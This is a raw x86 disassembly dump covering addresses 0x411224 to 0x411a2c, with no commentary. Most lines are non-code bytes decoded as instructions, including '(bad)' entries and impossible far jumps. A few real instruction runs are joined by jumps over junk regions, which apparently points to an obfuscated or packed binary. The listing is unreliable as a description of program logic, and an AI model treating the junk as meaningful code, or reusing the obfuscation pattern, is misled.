  411224:	outs   dx,BYTE PTR ds:[esi]
  411225:	xor    ecx,ebx
  411227:	das    
  411228:	mov    ds:0x88ef0237,eax
  41122d:	jbe    0x41123f
  41122f:	repz xlat BYTE PTR cs:[ebx]
  411232:	jno    0x41125a
  411234:	mov    ch,0x6d
  411236:	out    0xb1,al
  411238:	fsubr  QWORD PTR [ebx-0x7]
  41123b:	mov    ah,0x3a
  41123d:	div    BYTE PTR [eax-0x181c3260]
  411243:	jae    0x41125c
  411245:	jl     0x41120f
  411247:	sbb    eax,0x785b3d78
  41124d:	imul   ecx,DWORD PTR [ebp-0x1ddc4e72],0x73ef7e4d
  411257:	pop    edx
  411258:	test   al,0x2d
  41125a:	sub    al,BYTE PTR [eax-0xa30379f]
  411260:	push   ecx
  411261:	icebp  
  411262:	ds test al,0x4b
  411265:	sbb    esi,DWORD PTR [edi]
  411267:	lea    esi,[ecx+0x70]
  41126a:	xchg   esp,eax
  41126b:	xchg   edx,eax
  41126d:	jbe    0x411247
  41126f:	inc    edx
  411270:	push   ebp
  411271:	(bad)  
  411273:	mov    cl,0xb3
  411275:	mov    ecx,0x58101ab9
  41127a:	outs   dx,BYTE PTR ds:[esi]
  41127b:	mov    eax,ds:0xcb14dd84
  411280:	in     eax,dx
  411281:	and    ebp,edx
  411283:	mov    edx,0x152fcfe7
  411288:	jo     0x4112d8
  41128a:	or     BYTE PTR [esp+eax*4],0x47
  41128e:	dec    edi
  41128f:	cwde   
  411290:	cdq    
  411291:	mov    BYTE PTR [ecx],0x53
  411294:	ret    
  411295:	es mov al,0x19
  411298:	adc    al,ch
  41129a:	inc    esi
  41129b:	arpl   dx,di
  41129d:	pusha  
  41129e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41129f:	out    dx,al
  4112a0:	cmp    al,0x6c
  4112a2:	xor    eax,0x18cd0f2a
  4112a7:	sbb    ch,BYTE PTR [edi]
  4112a9:	or     edx,DWORD PTR [ebx-0xa]
  4112ac:	jb     0x4112ef
  4112ae:	scas   eax,DWORD PTR es:[edi]
  4112af:	rcl    bh,cl
  4112b1:	lods   al,BYTE PTR ds:[esi]
  4112b2:	loope  0x41123e
  4112b4:	pop    ss
  4112b5:	outs   dx,DWORD PTR ds:[esi]
  4112b6:	daa    
  4112b7:	lods   al,BYTE PTR ds:[esi]
  4112b8:	lahf   
  4112b9:	loopne 0x4112ca
  4112bb:	cdq    
  4112bc:	pop    edi
  4112bd:	bound  esp,QWORD PTR [esi-0x78]
  4112c0:	pop    edi
  4112c1:	daa    
  4112c2:	popa   
  4112c3:	scas   eax,DWORD PTR es:[edi]
  4112c4:	xchg   edi,eax
  4112c5:	pop    ss
  4112c6:	or     ebx,DWORD PTR [ecx]
  4112c8:	cmp    al,0x7d
  4112ca:	retf   0xe19f
  4112cd:	ret    
  4112ce:	xor    al,0xc3
  4112d0:	sbb    ebp,DWORD PTR [edi-0x8eb7284]
  4112d6:	out    dx,eax
  4112d7:	push   cs
  4112d8:	fld    DWORD PTR [esi+0x107e0b8b]
  4112de:	mul    esi
  4112e0:	pop    esi
  4112e1:	inc    edx
  4112e2:	mov    ebp,eax
  4112e4:	add    eax,0x1ec060cf
  4112e9:	push   esp
  4112ea:	ds adc dl,ch
  4112ed:	outs   dx,DWORD PTR ds:[esi]
  4112ee:	jmp    0x411335
  4112f0:	push   0x21
  4112f2:	bound  edx,QWORD PTR ds:0xaa6ab35b
  4112f8:	jge    0x41127f
  4112fa:	cdq    
  4112fb:	jne    0x411366
  4112fd:	sub    ah,BYTE PTR [ebx]
  4112ff:	pop    ebx
  411300:	repnz dec ecx
  411302:	xchg   BYTE PTR [edi],al
  411304:	ins    DWORD PTR es:[edi],dx
  411305:	bound  edi,QWORD PTR [edx+0x402c8b66]
  41130b:	dec    edi
  41130c:	pop    ecx
  41130d:	xor    dl,al
  41130f:	ins    DWORD PTR es:[edi],dx
  411310:	je     0x4112ca
  411312:	jg     0x4112a4
  411314:	daa    
  411315:	es fwait
  411317:	lea    esi,[ebp+0x43]
  41131a:	mov    ecx,0x4cb25ec5
  41131f:	dec    DWORD PTR [eax]
  411321:	jno    0x4112d8
  411323:	(bad)  
  411324:	mov    ebp,0x6b9e01f5
  411329:	jg     0x4112d0
  41132b:	and    eax,0xbaea1320
  411330:	stc    
  411331:	xor    BYTE PTR [eax-0x2957e73d],cl
  411337:	xor    ebp,0xf
  41133a:	push   edi
  41133b:	and    bl,ch
  41133d:	or     BYTE PTR [ebp*1+0x3cbc4995],cl
  411344:	inc    esi
  411345:	ja     0x411333
  411347:	xchg   ebx,eax
  411348:	dec    ebx
  411349:	add    eax,0xe6bed532
  41134e:	mov    ah,0xcc
  411350:	shl    BYTE PTR [edx+0xe],0x21
  411354:	sbb    al,0xa3
  411356:	aaa    
  411357:	push   cs
  411358:	mov    ah,0xc4
  41135a:	inc    esp
  41135b:	es xor eax,0x493f76e2
  411361:	mov    ds:0x9769c8c4,al
  411366:	pushf  
  411367:	in     eax,dx
  411368:	inc    ebp
  411369:	and    eax,0x46eaa08c
  41136e:	xchg   edi,eax
  41136f:	out    0x2c,eax
  411371:	fist   WORD PTR [ebp-0x4f68966d]
  411377:	xor    esi,edx
  411379:	es int 0x47
  41137c:	push   eax
  41137d:	or     DWORD PTR [eax-0x43],eax
  411380:	xchg   ebp,eax
  411381:	hlt    
  411382:	inc    ecx
  411383:	and    BYTE PTR [edx+0x36],bl
  411386:	sbb    esp,edi
  411388:	cmp    eax,edi
  41138a:	xor    eax,0x5e497e56
  41138f:	mov    cs,esi
  411391:	pop    esp
  411392:	hlt    
  411393:	imul   esp,DWORD PTR [ebx],0x76
  411396:	xlat   BYTE PTR ds:[ebx]
  411397:	sbb    eax,0x3cbefddd
  41139c:	std    
  41139d:	(bad)  
  41139e:	out    0x77,al
  4113a0:	outs   dx,BYTE PTR ds:[esi]
  4113a1:	(bad)  
  4113a2:	inc    eax
  4113a3:	push   ds
  4113a4:	sbb    ah,cl
  4113a6:	and    eax,0xdf50c85b
  4113ab:	scas   al,BYTE PTR es:[edi]
  4113ac:	out    dx,al
  4113ad:	xchg   ecx,eax
  4113ae:	lock mov dh,al
  4113b1:	add    BYTE PTR [ebp-0x7d44bf24],bh
  4113b7:	mov    DWORD PTR [edx],edx
  4113b9:	aaa    
  4113ba:	popa   
  4113bb:	dec    esp
  4113bc:	test   eax,0x47dc4fed
  4113c1:	mov    BYTE PTR [ebp+0x69],bl
  4113c4:	lods   eax,DWORD PTR ds:[esi]
  4113c5:	cli    
  4113c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113c7:	mov    ebx,0x4eac6f20
  4113cc:	(bad)  
  4113cd:	push   0x24915edf
  4113d2:	inc    ebx
  4113d3:	out    dx,al
  4113d4:	sbb    eax,ebx
  4113d6:	xor    DWORD PTR [eax-0x2adc6a3],0xffffff9c
  4113dd:	pop    esp
  4113de:	loope  0x4113ac
  4113e0:	(bad)  
  4113e1:	aaa    
  4113e2:	sub    eax,0xbce85483
  4113e7:	outs   dx,BYTE PTR ds:[esi]
  4113e8:	cmp    al,dh
  4113ea:	push   ebx
  4113eb:	sbb    al,0x93
  4113ed:	test   DWORD PTR [eax+0x46],ebp
  4113f0:	rcr    DWORD PTR [edx-0x4],0x4c
  4113f4:	adc    ebp,edx
  4113f6:	call   0xfac0:0x865bc5
  4113fd:	pusha  
  4113fe:	mov    ds,WORD PTR ds:0x8e234e27
  411404:	imul   eax,DWORD PTR [ebp-0x7c],0x729a1154
  41140b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41140c:	push   ds
  41140d:	jmp    0xfc7a:0x4a8490f9
  411414:	xor    DWORD PTR [esi],edi
  411416:	out    0xcd,al
  411418:	daa    
  411419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41141a:	pop    edi
  41141b:	pop    esp
  41141c:	sub    BYTE PTR [esp+edx*2-0x7cfad9b9],ch
  411423:	pop    ecx
  411424:	shl    DWORD PTR [ecx],cl
  411426:	fwait
  411427:	or     cl,al
  411429:	call   0x9bcd3761
  41142e:	sbb    al,0x11
  411430:	stc    
  411431:	dec    esi
  411432:	mov    edx,0x67ec7ffb
  411437:	hlt    
  411438:	in     al,0x82
  41143a:	outs   dx,BYTE PTR ds:[esi]
  41143b:	xor    cl,al
  41143d:	out    dx,eax
  41143e:	rcr    DWORD PTR [edi],1
  411440:	push   ss
  411441:	in     eax,dx
  411442:	pop    eax
  411443:	pop    esp
  411444:	fist   DWORD PTR [ebx-0x6b]
  411447:	mov    ah,0x42
  411449:	int    0x6e
  41144b:	popf   
  41144c:	sbb    BYTE PTR [ecx-0x500870c9],al
  411452:	aam    0xe0
  411454:	mov    DWORD PTR [ebp-0xb0],0x7564
  41145e:	mov    DWORD PTR [ebp-0xac],0x18cf
  411468:	mov    DWORD PTR [ebp-0xa0],0x3135
  411472:	mov    DWORD PTR [ebp-0x9c],0x568d
  41147c:	mov    DWORD PTR [ebp-0x90],0x11f2
  411486:	mov    DWORD PTR [ebp-0x8c],0x63ea
  411490:	mov    DWORD PTR [ebp-0x10],0x3066
  411497:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41149e:	push   0x7e1d
  4114a3:	jmp    0x411718
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x737e2188]
  4114b5:	into   
  4114b6:	jne    0x411534
  4114b8:	inc    edi
  4114b9:	js     0x4114d3
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	push   esi
  4114c1:	add    al,BYTE PTR [ecx+0x7ab8c5de]
  4114c7:	into   
  4114c8:	mov    edi,0xa84d0953
  4114cd:	rcl    DWORD PTR [edi-0x33],cl
  4114d0:	xor    eax,edi
  4114d2:	xchg   edx,ebx
  4114d4:	retf   
  4114d5:	dec    edi
  4114d6:	adc    BYTE PTR [ecx],0x93
  4114d9:	or     bl,BYTE PTR [ebx]
  4114db:	mov    esp,edi
  4114dd:	adc    BYTE PTR [ebx+0x2f],dl
  4114e0:	inc    eax
  4114e1:	jns    0x411547
  4114e3:	push   ecx
  4114e4:	not    BYTE PTR [ebp-0x424b7e1f]
  4114ea:	(bad)  
  4114eb:	pop    ebx
  4114ec:	aam    0xee
  4114ee:	xchg   DWORD PTR [esi+0x66],ebx
  4114f1:	adc    eax,0x55560a6d
  4114f6:	mul    DWORD PTR [esi+0xd512485]
  4114fc:	inc    esi
  4114fd:	sti    
  4114fe:	aaa    
  4114ff:	out    0xfb,al
  411501:	dec    edi
  411502:	shl    DWORD PTR [ecx+0x447bcdf0],cl
  411508:	jge    0x4114ec
  41150a:	dec    ecx
  41150b:	xchg   ebx,eax
  41150c:	sub    DWORD PTR [esi*1-0x2aa70cac],ebp
  411513:	fs sub ah,bh
  411516:	pop    ebp
  411517:	fistp  QWORD PTR [eax-0x57]
  41151a:	mov    al,0x7
  41151c:	out    0x85,eax
  41151e:	mov    eax,0x47756c4a
  411524:	sbb    al,bh
  411526:	or     ah,bl
  411528:	mov    al,0x82
  41152a:	push   edx
  41152b:	stc    
  41152c:	es sti 
  41152e:	arpl   WORD PTR [esi],di
  411530:	dec    eax
  411531:	sub    esp,edi
  411533:	push   ds
  411534:	sbb    BYTE PTR [ebx],bh
  411536:	test   eax,0xd59f9185
  41153b:	xor    ah,cl
  41153d:	sub    bl,cl
  41153f:	push   0x2b258d4e
  411544:	daa    
  411545:	aas    
  411546:	and    al,0x44
  411549:	or     BYTE PTR fs:[edx],bl
  41154c:	and    al,dl
  41154e:	xchg   BYTE PTR [esi-0x3d6613ec],cl
  411554:	mov    al,0x7d
  411556:	mov    dh,0xa4
  411558:	inc    edi
  411559:	ins    DWORD PTR es:[edi],dx
  41155a:	ret    
  41155b:	loop   0x4114fa
  41155d:	sar    DWORD PTR [eax],1
  41155f:	lods   eax,DWORD PTR ds:[esi]
  411560:	xchg   edi,eax
  411561:	sub    BYTE PTR [esi+edx*4-0x21],0x73
  411566:	dec    edx
  411567:	(bad)  
  411568:	std    
  411569:	(bad)  
  41156a:	adc    al,0xb8
  41156c:	ins    DWORD PTR es:[edi],dx
  41156d:	push   edi
  41156e:	dec    ebp
  41156f:	dec    edx
  411570:	cmp    BYTE PTR [ecx+0x7d],ah
  411573:	xchg   DWORD PTR [ebx],edx
  411575:	call   0x1b5d:0x9904df91
  41157c:	(bad)  
  41157d:	shl    ebp,cl
  41157f:	jl     0x411584
  411581:	sbb    al,0xd4
  411583:	cs jmp 0x8bf6:0x74fadc47
  41158b:	pop    es
  41158c:	cs jo  0x411579
  41158f:	mov    ecx,0x2af1455b
  411594:	cs loopne 0x41160f
  411597:	push   edi
  411598:	dec    edi
  411599:	jbe    0x4115e0
  41159b:	or     ah,ah
  41159d:	mov    ebp,0x6783c62c
  4115a2:	dec    esi
  4115a3:	push   edx
  4115a4:	push   0x2a
  4115a6:	and    al,0x5c
  4115a8:	stc    
  4115a9:	fcomi  st,st(1)
  4115ab:	lea    edi,[ebx+edi*8-0x7d]
  4115af:	xor    al,0xa
  4115b1:	cmp    al,0x22
  4115b3:	(bad)  
  4115b4:	mov    dl,BYTE PTR [eax]
  4115b6:	dec    ecx
  4115b7:	xchg   BYTE PTR [edi],bl
  4115b9:	lahf   
  4115ba:	mov    dh,0x26
  4115bc:	fs push esi
  4115be:	xchg   esp,eax
  4115bf:	test   al,dh
  4115c1:	imul   esi,DWORD PTR [edi-0x6f],0xffffffdf
  4115c5:	fldenv [ecx-0x35]
  4115c8:	aas    
  4115c9:	out    0x23,al
  4115cb:	sahf   
  4115cc:	sar    BYTE PTR [ecx+0x7f63502e],cl
  4115d2:	inc    BYTE PTR [edi]
  4115d4:	sbb    eax,0x1cc4c7ff
  4115d9:	pop    ss
  4115da:	xchg   esi,eax
  4115db:	mov    esi,0x6113ed09
  4115e0:	gs mov eax,0xa9544bf3
  4115e6:	mov    al,0xe1
  4115e8:	outs   dx,DWORD PTR ds:[esi]
  4115e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ea:	fist   DWORD PTR [eax+ebx*4]
  4115ed:	xchg   ch,bh
  4115ef:	scas   eax,DWORD PTR es:[edi]
  4115f0:	mov    ch,0xf1
  4115f2:	mov    eax,ds:0x44f00392
  4115f7:	sub    BYTE PTR [edi+0x6e],0x18
  4115fb:	out    0x6f,al
  4115fd:	adc    eax,0x97a01393
  411602:	lea    ebp,ds:0x8058c20d
  411608:	mov    dh,0xe6
  41160a:	jns    0x4115a0
  41160c:	ret    0x86d4
  41160f:	or     DWORD PTR [edx-0x11],0x6e58719f
  411616:	xor    ebp,DWORD PTR ds:0x7801f545
  41161c:	outs   dx,BYTE PTR ds:[esi]
  41161d:	add    dh,bl
  41161f:	rcl    BYTE PTR [edx+0x36b9018f],cl
  411625:	mov    ch,0xea
  411627:	enter  0x5db3,0xe7
  41162b:	dec    esp
  41162c:	and    esp,ebp
  41162e:	in     al,dx
  41162f:	jbe    0x411671
  411631:	inc    edx
  411632:	icebp  
  411633:	hlt    
  411634:	scas   al,BYTE PTR es:[edi]
  411635:	pop    ds
  411636:	fist   DWORD PTR [edi]
  411638:	stos   BYTE PTR es:[edi],al
  411639:	pusha  
  41163a:	dec    DWORD PTR [edx+0x65]
  41163d:	add    eax,0x5cf54162
  411642:	push   ss
  411643:	jnp    0x4115c7
  411645:	mov    esp,ebp
  411647:	or     eax,0xec080125
  41164c:	mov    esi,0x2f64e6c0
  411651:	lods   eax,DWORD PTR ds:[esi]
  411652:	xchg   esp,eax
  411653:	or     bh,BYTE PTR [ecx+0x32]
  411656:	jl     0x4115e0
  411658:	or     al,0x7a
  41165a:	pop    es
  41165b:	out    dx,eax
  41165c:	or     ebp,DWORD PTR [ebp+ebx*4-0x7b]
  411660:	push   ds
  411661:	arpl   WORD PTR ds:[ebx+0x3563e76a],sp
  411668:	pop    es
  411669:	dec    ebp
  41166a:	lock scas eax,DWORD PTR es:[edi]
  41166c:	imul   ebx,DWORD PTR [ebx+edi*4+0x7002cfb9],0xffffff8a
  411674:	(bad)  
  411675:	sub    ebp,DWORD PTR [ecx+0x74]
  411678:	in     al,dx
  411679:	loop   0x411647
  41167b:	test   al,0x1d
  41167d:	dec    esp
  41167e:	pushf  
  41167f:	jo     0x41161c
  411681:	sub    eax,0xb9ca4b89
  411686:	fwait
  411687:	jno    0x411674
  411689:	jle    0x411656
  41168b:	mov    dh,0x4a
  41168d:	repz js 0x411655
  411690:	cs ins DWORD PTR es:[edi],dx
  411692:	push   esp
  411693:	xchg   DWORD PTR [edi+0x5e40c279],ebx
  411699:	dec    ecx
  41169a:	lods   al,BYTE PTR ds:[esi]
  41169b:	retf   
  41169c:	mov    al,0x14
  41169e:	fnstcw WORD PTR [esi+0xb]
  4116a1:	scas   al,BYTE PTR es:[edi]
  4116a2:	and    esi,esp
  4116a4:	outs   dx,DWORD PTR ds:[esi]
  4116a5:	pop    ebp
  4116a6:	jecxz  0x411725
  4116a8:	ds in  al,0xf8
  4116ab:	mov    ecx,DWORD PTR ds:0x3bc27da3
  4116b1:	imul   edi,eax,0x55
  4116b4:	sbb    al,0x67
  4116b6:	sbb    ah,ah
  4116b8:	push   ebp
  4116b9:	pop    edi
  4116ba:	push   ecx
  4116bb:	shl    ecx,0x95
  4116be:	inc    esp
  4116bf:	push   es
  4116c0:	int3   
  4116c1:	icebp  
  4116c2:	jmp    FWORD PTR [ecx]
  4116c4:	add    ebx,ebx
  4116c6:	sub    DWORD PTR [esp+eax*2-0x60],esp
  4116ca:	mov    eax,ds:0x9a3398dd
  4116cf:	mov    bl,0xac
  4116d1:	xchg   DWORD PTR [eax-0x474a59dd],edx
  4116d7:	sub    eax,0x7dd36176
  4116dc:	cmp    esi,DWORD PTR [edx+0x7ed6ea1]
  4116e2:	cmp    eax,0xb92b291
  4116e7:	adc    DWORD PTR [ebx+esi*4],0x35
  4116eb:	xchg   esi,eax
  4116ec:	sbb    al,0xf
  4116ee:	fisub  WORD PTR [edx]
  4116f0:	stos   BYTE PTR es:[edi],al
  4116f1:	ror    ecx,0xc8
  4116f4:	sahf   
  4116f5:	test   BYTE PTR [ebp-0x46d59122],0xec
  4116fc:	ds fs jecxz 0x4116ca
  411700:	in     eax,dx
  411701:	test   eax,0xf8e29130
  411706:	adc    eax,0xef2ada04
  41170b:	mov    gs,WORD PTR ds:0x2d886a5
  411711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411712:	dec    ecx
  411713:	outs   dx,BYTE PTR ds:[esi]
  411714:	retf   0x1dc1
  411717:	loopne 0x4116e0
  411719:	inc    ebp
  41171a:	cld    
  41171b:	hlt    
  41171c:	xor    BYTE PTR [eax],al
  41171e:	add    BYTE PTR [ebx+0x4d8be045],cl
  411724:	in     al,0x68
  411726:	adc    BYTE PTR [ebx+0x0],0x0
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0xb2f3aa57
  411755:	out    dx,al
  411756:	mov    esi,0x1818749e
  41175b:	jno    0x411771
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	pop    eax
  411760:	jns    0x4117db
  411762:	clc    
  411763:	lods   eax,DWORD PTR ds:[esi]
  411764:	or     DWORD PTR [eax],ebx
  411766:	imul   ebp,DWORD PTR [eax-0xf],0xffffffe3
  41176a:	outs   dx,BYTE PTR ds:[esi]
  41176b:	pop    eax
  41176c:	jmp    0x944a36d4
  411771:	sub    DWORD PTR [esi+0x73d2b7f0],esp
  411777:	ja     0x41177e
  411779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41177a:	fisubr WORD PTR [eax]
  41177c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41177d:	sub    al,0x2a
  41177f:	pop    ds
  411780:	popf   
  411781:	stos   DWORD PTR es:[edi],eax
  411782:	call   0xb654b849
  411787:	mov    ebp,0xe16200d2
  41178c:	imul   ebp,DWORD PTR [ecx-0x7c],0x83da7026
  411793:	mov    ah,0xe
  411795:	and    al,0xc8
  411797:	sub    bl,BYTE PTR [esi+ecx*8+0x71]
  41179b:	test   BYTE PTR [eax+0x28c56f9f],ch
  4117a1:	jmp    0x4117b9
  4117a3:	mov    ax,ds:0x4652c173
  4117a9:	adc    eax,0xc30cb299
  4117ae:	adc    dh,BYTE PTR [edi+0x7fdfb4f0]
  4117b4:	or     ecx,esp
  4117b6:	add    DWORD PTR [edx-0x4e],0x8bd04294
  4117bd:	jbe    0x4117ea
  4117bf:	mov    esp,0x44777cf9
  4117c4:	mov    ch,0x46
  4117c6:	ror    DWORD PTR [esi-0x48],cl
  4117c9:	adc    eax,0xd23fb73
  4117ce:	mov    ebx,0x4ec66506
  4117d3:	aaa    
  4117d4:	std    
  4117d5:	loope  0x411856
  4117d7:	(bad)  
  4117d9:	pop    esi
  4117da:	push   edx
  4117db:	pop    ebx
  4117dc:	jbe    0x411775
  4117de:	leave  
  4117df:	mov    ds:0xf2328ba3,eax
  4117e4:	ret    0xad35
  4117e7:	icebp  
  4117e8:	aas    
  4117e9:	cwde   
  4117ea:	adc    al,0x5e
  4117ec:	sbb    BYTE PTR [edx-0x4f376e79],dh
  4117f2:	aam    0xd7
  4117f4:	jo     0x411791
  4117f6:	cmp    al,BYTE PTR [ebx]
  4117f8:	lock inc eax
  4117fa:	test   BYTE PTR [ebx],ah
  4117fc:	sbb    eax,0xb4763f4b
  411801:	js     0x411837
  411803:	fnsave [ebx+0x1f]
  411806:	xchg   edx,eax
  411807:	call   ebx
  411809:	mov    dl,0x9e
  41180b:	loopne 0x41184f
  41180d:	cmp    DWORD PTR [ebx+ecx*4+0x6461f9d],esp
  411814:	test   al,0x8c
  411816:	pop    ss
  411817:	cs and al,0xf0
  41181a:	mov    dh,0x99
  41181c:	mov    esp,DWORD PTR [ebx]
  41181e:	cld    
  41181f:	stos   BYTE PTR es:[edi],al
  411820:	jl     0x4117ac
  411822:	mov    edi,DWORD PTR [ecx-0x12e50ad7]
  411828:	and    eax,0xaef8598f
  41182d:	std    
  41182e:	adc    DWORD PTR [eax+0x51bebdf2],ecx
  411834:	not    BYTE PTR [ecx-0x78]
  411837:	jbe    0x411823
  411839:	shr    DWORD PTR [ecx+0x28430c8f],cl
  41183f:	mov    cl,0xdc
  411841:	adc    dh,BYTE PTR [edi-0x2e]
  411844:	or     DWORD PTR [ebp+0x3e],ecx
  411847:	push   0x410ef4bc
  41184c:	dec    ecx
  41184d:	(bad)  
  41184e:	neg    BYTE PTR [edi+0x9]
  411851:	(bad)  
  411852:	push   cs
  411853:	mov    WORD PTR [edi+edi*2+0x1ab6a98f],gs
  41185a:	cdq    
  41185b:	add    ebx,edi
  41185d:	cmp    al,0x6
  41185f:	enter  0xf2b8,0x3
  411863:	popf   
  411864:	jmp    0xef82a50
  411869:	retf   0x7675
  41186c:	clc    
  41186d:	sub    BYTE PTR [eax-0x517346a4],0x7
  411874:	lock xchg esi,eax
  411876:	cdq    
  411877:	sbb    eax,DWORD PTR [esi+0x4bb188e9]
  41187d:	dec    ebx
  41187e:	cmp    eax,edi
  411880:	dec    edi
  411881:	in     eax,0xb2
  411883:	pop    eax
  411884:	mov    ebp,0x9c566172
  411889:	mov    cl,0x9c
  41188b:	in     eax,0x2d
  41188d:	stos   DWORD PTR es:[edi],eax
  41188e:	(bad)  
  41188f:	mov    dh,0xd0
  411891:	add    al,0x8d
  411893:	daa    
  411894:	pushf  
  411895:	icebp  
  411896:	lds    ecx,FWORD PTR [edx+0x214122f8]
  41189c:	or     eax,DWORD PTR [ebx-0x7772b784]
  4118a2:	imul   eax,DWORD PTR [ecx-0x66],0x401bb663
  4118a9:	rcl    DWORD PTR [ebx],0xab
  4118ac:	mov    DWORD PTR ds:0xbb02f607,esi
  4118b2:	rcl    BYTE PTR [edi-0x20],1
  4118b5:	push   edi
  4118b6:	cwde   
  4118b7:	cs pusha 
  4118b9:	jecxz  0x4118b7
  4118bb:	adc    cl,dh
  4118bd:	ret    
  4118be:	jp     0x41188f
  4118c0:	xlat   BYTE PTR ds:[ebx]
  4118c1:	test   DWORD PTR [esi+0x2d],0x568a7b95
  4118c8:	mov    dl,0x1d
  4118ca:	jae    0x4118e9
  4118cc:	pusha  
  4118cd:	test   DWORD PTR [ebp-0x6481789f],ebx
  4118d3:	push   ebp
  4118d4:	xchg   edx,eax
  4118d5:	xlat   BYTE PTR ds:[ebx]
  4118d6:	mov    eax,ds:0x6c0225fe
  4118db:	sub    bl,dl
  4118dd:	int3   
  4118de:	scas   eax,DWORD PTR es:[edi]
  4118df:	pusha  
  4118e0:	int3   
  4118e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e2:	cs ret 
  4118e4:	mov    edi,0xb92e3f1a
  4118e9:	(bad)  [ebp+0x40]
  4118ec:	adc    cl,BYTE PTR [edx]
  4118ee:	xor    ch,cl
  4118f0:	dec    edx
  4118f1:	test   BYTE PTR [eax+0x1d70e0c9],bh
  4118f7:	stos   BYTE PTR es:[edi],al
  4118f8:	ins    DWORD PTR es:[edi],dx
  4118f9:	fstp   DWORD PTR [edx-0x8]
  4118fc:	push   ds
  4118fd:	mov    esi,0x150079c5
  411902:	cmp    eax,0x42601c5a
  411907:	mov    WORD PTR [esi],?
  411909:	mov    ecx,0xd593c8aa
  41190e:	(bad)  
  41190f:	out    dx,al
  411910:	cwde   
  411911:	cdq    
  411912:	push   edi
  411913:	push   edi
  411914:	jbe    0x4118bf
  411916:	arpl   dx,cx
  411918:	pushf  
  411919:	and    eax,0x837f32f8
  41191e:	repz test al,al
  411921:	mov    ebx,0xb2b8124a
  411926:	js     0x41195e
  411928:	imul   edx,DWORD PTR [edx-0x24a011bc],0xbe15fdf4
  411932:	xor    dl,0xa0
  411935:	aaa    
  411936:	rol    ch,0x4a
  411939:	mov    dl,ah
  41193b:	test   al,0xa2
  41193d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193e:	outs   dx,DWORD PTR ds:[esi]
  41193f:	or     edx,DWORD PTR [edi-0x75]
  411942:	mov    al,ds:0xac0190cd
  411947:	ja     0x411997
  411949:	repz repz in eax,0xa4
  41194d:	dec    esi
  41194e:	add    ebp,DWORD PTR [ecx]
  411950:	mov    ebx,0xba73ca57
  411955:	cmc    
  411956:	mov    ch,BYTE PTR [edx-0xa8fd603]
  41195c:	and    eax,0x375cb0cb
  411961:	xor    BYTE PTR [ecx],dl
  411963:	dec    esi
  411964:	or     BYTE PTR [eax+esi*2+0x3],ch
  411968:	fucomip st,st(7)
  41196a:	bound  ecx,QWORD PTR ds:0x25db6189
  411970:	test   bl,cl
  411972:	fadd   QWORD PTR [edx+0x134b5216]
  411978:	mov    ebx,0x21a0cc63
  41197d:	mov    ebx,0x97421b75
  411982:	mov    ds:0x7ef2ef8d,al
  411987:	sbb    dh,BYTE PTR [esp+edi*2-0x7d27c51c]
  41198e:	mov    eax,ds:0x96cb8f1b
  411993:	xor    BYTE PTR [edx],ah
  411995:	fisubr DWORD PTR [ebx-0x5f]
  411998:	pminsw mm4,mm7
  41199b:	add    BYTE PTR [edx+eiz*1+0x72],dh
  41199f:	add    al,0xd8
  4119a1:	sbb    ecx,DWORD PTR [eax]
  4119a3:	cmp    cl,BYTE PTR [edi]
  4119a5:	push   cs
  4119a6:	xchg   edx,eax
  4119a7:	jne    0x4119e9
  4119a9:	sub    edi,edx
  4119ab:	stos   BYTE PTR es:[edi],al
  4119ac:	jp     0x4119f1
  4119ae:	and    al,0x6e
  4119b0:	(bad)  
  4119b1:	sub    BYTE PTR [eax-0x2e],dl
  4119b4:	retf   0x2a38
  4119b7:	mov    edx,DWORD PTR [ebp-0x3c]
  4119ba:	xor    ecx,0xf3a
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422538
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x70cdf336
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	inc    edi
  411a15:	jbe    0x4119f7
  411a17:	xor    BYTE PTR [ebp+0x61],ch
  411a1a:	push   esp
  411a1b:	ins    BYTE PTR es:[edi],dx
  411a1c:	cmp    eax,0x41c341f5
  411a21:	scas   al,BYTE PTR es:[edi]
  411a22:	test   BYTE PTR [esi-0x48ee516f],ch
  411a28:	jno    0x411a91
  411a2a:	mov    DWORD PTR [ebx],ebp
  411a2c:	jg     0x662309ae
